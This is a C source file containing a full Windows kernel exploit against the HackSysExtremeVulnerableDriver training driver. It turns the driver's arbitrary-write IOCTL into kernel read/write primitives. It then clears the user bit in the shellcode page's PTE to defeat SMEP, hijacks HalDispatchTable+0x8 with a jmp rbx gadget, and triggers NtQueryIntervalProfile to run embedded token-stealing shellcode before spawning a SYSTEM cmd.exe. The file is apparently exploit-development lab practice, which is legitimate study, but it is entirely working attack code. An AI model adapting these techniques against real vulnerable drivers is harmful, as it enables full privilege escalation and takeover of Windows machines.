#include <windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <string.h>

#pragma comment(lib, "Psapi.lib")

#define QWORD ULONGLONG

#define HEVD_IOCTL_ARBITRARY_WRITE 0x22200B
#define DEVICE_NAME L"\\\\.\\HackSysExtremeVulnerableDriver"

#define HALDISPATCHTABLE_FALLBACK_OFFSET 0xC00A60ULL
#define HAL_ENTRY_OFFSET 0x8ULL
#define ProfileTotalIssues 2

#define IMAGE_SCN_MEM_EXECUTE 0x20000000
#define JMP_RBX_BYTE_1 0xFF
#define JMP_RBX_BYTE_2 0xE3

#define MIGETPTEADDRESS_PTEBASE_RVA 0x00298793ULL
#define MMPTEBASE_RVA               0x00CFB358ULL

#define PTE_VALID_BIT               0x1ULL
#define PTE_WRITE_BIT               0x2ULL
#define PTE_USER_SUPERVISOR_BIT     0x4ULL
#define PTE_NX_BIT                  0x8000000000000000ULL

typedef LONG NTSTATUS;

typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(
    ULONG ProfileSource,
    PULONG Interval
    );

typedef struct _WRITE_WHAT_WHERE
{
    QWORD* What;
    QWORD* Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;


BOOL TriggerWriteWhatWhere(HANDLE hDevice, QWORD* what, QWORD* where)
{
    WRITE_WHAT_WHERE request = { 0 };

    request.What = what;
    request.Where = where;

    DWORD bytesReturned = 0;

    return DeviceIoControl(
        hDevice,
        HEVD_IOCTL_ARBITRARY_WRITE,
        &request,
        sizeof(request),
        NULL,
        0,
        &bytesReturned,
        NULL
    );
}


QWORD ReadQWORD(HANDLE hDevice, QWORD kernelAddress)
{
    QWORD value = 0;

    BOOL ok = TriggerWriteWhatWhere(
        hDevice,
        (QWORD*)kernelAddress,
        &value
    );

    if (!ok)
    {
        printf("[-] ReadQWORD failed at 0x%llx. Error=%lu\n",
            kernelAddress,
            GetLastError()
        );
    }

    return value;
}


BOOL WriteQWORD(HANDLE hDevice, QWORD kernelAddress, QWORD valueToWrite)
{
    QWORD value = valueToWrite;

    BOOL ok = TriggerWriteWhatWhere(
        hDevice,
        &value,
        (QWORD*)kernelAddress
    );

    if (!ok)
    {
        printf("[-] WriteQWORD failed at 0x%llx. Error=%lu\n",
            kernelAddress,
            GetLastError()
        );
    }

    return ok;
}


BYTE ReadBYTE(HANDLE hDevice, QWORD kernelAddress)
{
    QWORD alignedAddress = kernelAddress & ~0x7ULL;
    QWORD value = ReadQWORD(hDevice, alignedAddress);

    DWORD shift = (DWORD)((kernelAddress & 0x7ULL) * 8);

    return (BYTE)((value >> shift) & 0xff);
}

QWORD GetKernelBaseAddress(LPCWSTR driverName)
{
    LPVOID drivers[1024] = { 0 };
    DWORD cbNeeded = 0;

    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded))
    {
        printf("[-] EnumDeviceDrivers failed. Error=%lu\n", GetLastError());
        return 0;
    }

    int driverCount = cbNeeded / sizeof(drivers[0]);

    for (int i = 0; i < driverCount; i++)
    {
        WCHAR currentDriverName[MAX_PATH] = { 0 };

        if (GetDeviceDriverBaseNameW(
            drivers[i],
            currentDriverName,
            MAX_PATH
        ))
        {
            if (_wcsicmp(currentDriverName, driverName) == 0)
            {
                return (QWORD)drivers[i];
            }
        }
    }

    return 0;
}

QWORD GetPteAddress(QWORD virtualAddress, QWORD pteBase)
{
    return pteBase + ((virtualAddress >> 9) & 0x7FFFFFFFF8ULL);
}

BOOL IsCanonicalKernelAddress(QWORD address)
{
    return (address >= 0xFFFF000000000000ULL);
}

void PrintPteBits(const char* label, QWORD pteValue)
{
    printf("[+] %s: P=%llu W=%llu U=%llu NX=%llu Raw=0x%llx\n",
        label,
        (pteValue & PTE_VALID_BIT) ? 1ULL : 0ULL,
        (pteValue & PTE_WRITE_BIT) ? 1ULL : 0ULL,
        (pteValue & PTE_USER_SUPERVISOR_BIT) ? 1ULL : 0ULL,
        (pteValue & PTE_NX_BIT) ? 1ULL : 0ULL,
        pteValue
    );
}

QWORD ResolvePteBase(HANDLE hDevice, QWORD ntBase)
{
    QWORD miGetPteImmediateAddress = ntBase + MIGETPTEADDRESS_PTEBASE_RVA;
    QWORD mmPteBaseVariableAddress = ntBase + MMPTEBASE_RVA;

    QWORD pteBaseFromMiGet = ReadQWORD(hDevice, miGetPteImmediateAddress);
    QWORD pteBaseFromMmPteBase = ReadQWORD(hDevice, mmPteBaseVariableAddress);

    printf("[+] MiGetPteAddress+0x13 VA: 0x%llx\n", miGetPteImmediateAddress);
    printf("[+] MmPteBase variable VA:   0x%llx\n", mmPteBaseVariableAddress);
    printf("[+] PTE base from MiGet:     0x%llx\n", pteBaseFromMiGet);
    printf("[+] PTE base from MmPteBase: 0x%llx\n", pteBaseFromMmPteBase);

    if (IsCanonicalKernelAddress(pteBaseFromMiGet))
    {
        if (pteBaseFromMmPteBase && pteBaseFromMiGet != pteBaseFromMmPteBase)
        {
            printf("[!] PTE base sources differ. Using MiGetPteAddress value.\n");
        }

        return pteBaseFromMiGet;
    }

    if (IsCanonicalKernelAddress(pteBaseFromMmPteBase))
    {
        printf("[!] MiGetPteAddress value looked invalid. Using MmPteBase variable value.\n");
        return pteBaseFromMmPteBase;
    }

    printf("[-] Failed to resolve a valid PTE base\n");
    return 0;
}

BOOL MakePageSupervisor(
    HANDLE hDevice,
    QWORD targetVa,
    QWORD pteBase,
    QWORD* outPteAddress,
    QWORD* outOriginalPte
)
{
    QWORD pteAddress = GetPteAddress(targetVa, pteBase);
    QWORD originalPte = ReadQWORD(hDevice, pteAddress);
    QWORD modifiedPte = 0;
    QWORD verifyPte = 0;

    printf("[+] Target VA:               0x%llx\n", targetVa);
    printf("[+] Target PTE address:      0x%llx\n", pteAddress);
    PrintPteBits("Original PTE", originalPte);

    if (!(originalPte & PTE_VALID_BIT))
    {
        printf("[-] Shellcode PTE is not present/valid. PTE calculation is probably wrong.\n");
        return FALSE;
    }

    if (!(originalPte & PTE_USER_SUPERVISOR_BIT))
    {
        printf("[!] Shellcode PTE is already supervisor. SMEP should not block this page.\n");
    }

    if (originalPte & PTE_NX_BIT)
    {
        printf("[-] Shellcode PTE has NX set. CPU cannot execute this page even after clearing U/S.\n");
        return FALSE;
    }

    modifiedPte = originalPte & ~PTE_USER_SUPERVISOR_BIT;

    PrintPteBits("Modified PTE", modifiedPte);

    if (!WriteQWORD(hDevice, pteAddress, modifiedPte))
    {
        printf("[-] Failed to write modified shellcode PTE\n");
        return FALSE;
    }

    verifyPte = ReadQWORD(hDevice, pteAddress);
    PrintPteBits("Verified PTE", verifyPte);

    if (verifyPte & PTE_USER_SUPERVISOR_BIT)
    {
        printf("[-] Verified PTE still has U/S bit set. SMEP will still block execution.\n");
        return FALSE;
    }

    if (verifyPte & PTE_NX_BIT)
    {
        printf("[-] Verified PTE has NX set. Execution will still fail.\n");
        return FALSE;
    }

    if (outPteAddress)
    {
        *outPteAddress = pteAddress;
    }

    if (outOriginalPte)
    {
        *outOriginalPte = originalPte;
    }

    printf("[+] Shellcode page is now supervisor from the paging perspective.\n");
    return TRUE;
}

unsigned char shellcode[] = {
    0x9c, 0x53, 0x51, 0x52, 0x56, 0x57, 0x55, 0x41,
    0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x41,
    0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x65,
    0x48, 0x8b, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,
    0x48, 0x8b, 0x80, 0xb8, 0x00, 0x00, 0x00, 0x48,
    0x89, 0xc3, 0x49, 0x89, 0xc4, 0x4d, 0x8b, 0xa4,
    0x24, 0x48, 0x04, 0x00, 0x00, 0x49, 0x81, 0xec,
    0x48, 0x04, 0x00, 0x00, 0x4d, 0x8b, 0xac, 0x24,
    0x40, 0x04, 0x00, 0x00, 0x49, 0x83, 0xfd, 0x04,
    0x75, 0xe3, 0x4d, 0x8b, 0xac, 0x24, 0xb8, 0x04,
    0x00, 0x00, 0x49, 0x83, 0xe5, 0xf0, 0x4c, 0x8b,
    0xb3, 0xb8, 0x04, 0x00, 0x00, 0x49, 0x83, 0xe6,
    0x0f, 0x4d, 0x09, 0xf5, 0x4c, 0x89, 0xab, 0xb8,
    0x04, 0x00, 0x00, 0x41, 0x5f, 0x41, 0x5e, 0x41,
    0x5d, 0x41, 0x5c, 0x41, 0x5b, 0x41, 0x5a, 0x41,
    0x59, 0x41, 0x58, 0x5d, 0x5f, 0x5e, 0x5a, 0x59,
    0x5b, 0x9d, 0xb8, 0x00, 0x00, 0x00, 0x00, 0xc3
};

int main()
{
    HANDLE hDevice = INVALID_HANDLE_VALUE;
    LPVOID shellcodeAddress = NULL;

    QWORD ntBase = 0;
    QWORD halDispatchTable = 0;
    QWORD halDispatchEntry = 0;
    QWORD originalHalEntry = 0;
    QWORD verifyHalEntry = 0;
    QWORD restoredHalEntry = 0;
    QWORD jmpRbxGadget = 0;
    QWORD pteBase = 0;
    QWORD shellcodePteAddress = 0;
    QWORD originalShellcodePte = 0;
    QWORD restoredShellcodePte = 0;

    HMODULE ntdll = NULL;
    NtQueryIntervalProfile_t NtQueryIntervalProfile = NULL;

	BYTE b1 = 0, b2 = 0;

    ULONG interval = 0;
    NTSTATUS status = 0;

    BOOL halOverwritten = FALSE;
    BOOL pteOverwritten = FALSE;

    printf("[+] Opening device: %ls\n", DEVICE_NAME);

    hDevice = CreateFileW(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateFileW failed. Error=%lu\n", GetLastError());
        return 1;
    }

    ntBase = GetKernelBaseAddress(L"ntoskrnl.exe");

    if (!ntBase)
    {
        ntBase = GetKernelBaseAddress(L"ntkrnlmp.exe");
    }

    if (!ntBase)
    {
        printf("[-] Failed to find ntoskrnl.exe / ntkrnlmp.exe base\n");
        goto cleanup;
    }

    printf("[+] nt base:                 0x%llx\n", ntBase);

	halDispatchTable = ntBase + HALDISPATCHTABLE_FALLBACK_OFFSET;

    halDispatchEntry = halDispatchTable + HAL_ENTRY_OFFSET;

    printf("[+] HalDispatchTable:        0x%llx\n", halDispatchTable);
    printf("[+] HalDispatchTable + 0x8:  0x%llx\n", halDispatchEntry);

    shellcodeAddress = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!shellcodeAddress)
    {
        printf("[-] VirtualAlloc failed. Error=%lu\n", GetLastError());
        goto cleanup;
    }

    memcpy(shellcodeAddress, shellcode, sizeof(shellcode));

    printf("[+] Shellcode address:       0x%p\n", shellcodeAddress);

    printf("[+] Resolving PTE base...\n");

    pteBase = ResolvePteBase(hDevice, ntBase);

    if (!pteBase)
    {
        printf("[-] Failed to resolve PTE base\n");
        goto cleanup;
    }

    printf("[+] Making shellcode page supervisor...\n");

    if (!MakePageSupervisor(
        hDevice,
        (QWORD)shellcodeAddress,
        pteBase,
        &shellcodePteAddress,
        &originalShellcodePte
    ))
    {
        printf("[-] Failed to modify shellcode PTE\n");
        goto cleanup;
    }

    pteOverwritten = TRUE;

    ntdll = GetModuleHandleA("ntdll.dll");

    if (!ntdll)
    {
        printf("[-] GetModuleHandleA(ntdll.dll) failed. Error=%lu\n", GetLastError());
        goto cleanup;
    }

    NtQueryIntervalProfile =
        (NtQueryIntervalProfile_t)GetProcAddress(
            ntdll,
            "NtQueryIntervalProfile"
        );

    if (!NtQueryIntervalProfile)
    {
        printf("[-] Failed to resolve NtQueryIntervalProfile. Error=%lu\n", GetLastError());
        goto cleanup;
    }

    originalHalEntry = ReadQWORD(hDevice, halDispatchEntry);

    if (!originalHalEntry)
    {
        printf("[-] Failed to read original HalDispatchTable entry\n");
        goto cleanup;
    }

    printf("[+] Original HAL entry:      0x%llx\n", originalHalEntry);

    printf("[+] Overwriting HalDispatchTable + 0x8...\n");

    jmpRbxGadget = ntBase + 0x044584a;

    printf("[+] JMP RBX gadget:          0x%llx\n", jmpRbxGadget);

    b1 = ReadBYTE(hDevice, jmpRbxGadget);
    b2 = ReadBYTE(hDevice, jmpRbxGadget + 1);

    printf("[+] Gadget VA:               0x%llx\n", jmpRbxGadget);
    printf("[+] Gadget RVA:              0x%llx\n", jmpRbxGadget - ntBase);
    printf("[+] Gadget bytes:            %02x %02x\n", b1, b2);

    if (b1 != 0xFF || b2 != 0xE3)
    {
        printf("[-] Not a live jmp rbx gadget. Aborting.\n");
        goto cleanup;
    }

    if (!WriteQWORD(
        hDevice,
        halDispatchEntry,
        jmpRbxGadget
    ))
    {
        printf("[-] Failed to overwrite HalDispatchTable entry\n");
        goto cleanup;
    }

    halOverwritten = TRUE;

    verifyHalEntry = ReadQWORD(hDevice, halDispatchEntry);

    printf("[+] HAL entry after write:   0x%llx\n", verifyHalEntry);

    if (verifyHalEntry != jmpRbxGadget)
    {
        printf("[-] HAL entry verification failed\n");
        goto cleanup;
    }

    printf("[+] Triggering NtQueryIntervalProfile...\n");

    printf("[+] About to trigger NtQueryIntervalProfile...\n");
    //__debugbreak();

    status = NtQueryIntervalProfile(
        ProfileTotalIssues,
        (PULONG)shellcodeAddress
    );

    printf("[+] NtQueryIntervalProfile returned: 0x%lx\n", status);

    printf("[+] Restoring original HAL entry...\n");

    if (!WriteQWORD(hDevice, halDispatchEntry, originalHalEntry))
    {
        printf("[-] Failed to restore original HAL entry\n");
        goto cleanup;
    }

    halOverwritten = FALSE;

    restoredHalEntry = ReadQWORD(hDevice, halDispatchEntry);

    printf("[+] HAL entry after restore: 0x%llx\n", restoredHalEntry);

    if (restoredHalEntry == originalHalEntry)
    {
        printf("[+] HAL entry restored successfully\n");
    }
    else
    {
        printf("[!] HAL entry restore verification mismatch\n");
    }

    printf("[+] Spawning cmd.exe\n");
    system("cmd.exe");

cleanup:

    if (halOverwritten && originalHalEntry)
    {
        printf("[!] Attempting emergency HAL entry restore...\n");
        WriteQWORD(hDevice, halDispatchEntry, originalHalEntry);
    }

    if (pteOverwritten && shellcodePteAddress && originalShellcodePte)
    {
        printf("[!] Restoring original shellcode PTE...\n");

        if (WriteQWORD(hDevice, shellcodePteAddress, originalShellcodePte))
        {
            restoredShellcodePte = ReadQWORD(hDevice, shellcodePteAddress);
            PrintPteBits("Restored shellcode PTE", restoredShellcodePte);
        }
        else
        {
            printf("[!] Failed to restore original shellcode PTE\n");
        }

        pteOverwritten = FALSE;
    }

    if (shellcodeAddress)
    {
        VirtualFree(shellcodeAddress, 0, MEM_RELEASE);
    }

    if (hDevice != INVALID_HANDLE_VALUE)
    {
        CloseHandle(hDevice);
    }

    return 0;
}